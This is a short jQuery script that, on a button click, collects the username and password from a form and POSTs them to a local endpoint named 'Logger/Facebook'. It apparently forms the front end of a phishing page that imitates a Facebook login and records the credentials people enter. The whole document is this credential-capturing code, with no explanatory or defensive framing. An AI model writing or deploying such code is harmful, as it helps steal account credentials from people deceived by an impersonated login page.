$(document).ready(function(){
	$("#login-haux").click(function(){
		var data = {
				username:$('#username').val(),
				password:$('#password').val()
		}
		$.ajax({
			url:"http://localhost:8080/Logger/Facebook",
			type:"POST",
			data:data,
			contentType:"application/json",
			success: function(data){
				console.log(data);
			}
		})
	})
});